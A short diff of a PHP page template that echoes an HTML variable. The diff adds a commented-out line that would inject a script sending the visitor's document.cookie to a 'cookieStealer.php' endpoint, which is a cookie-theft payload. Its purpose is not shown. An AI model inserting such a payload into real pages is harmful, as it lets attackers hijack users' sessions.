@@ -24,6 +24,7 @@
 
 <?php
 	echo $html;
+//	echo "<script>location.href='/cookieStealer.php?cookie='+document.cookie;</script>";
 ?>
 </div>
 </body>
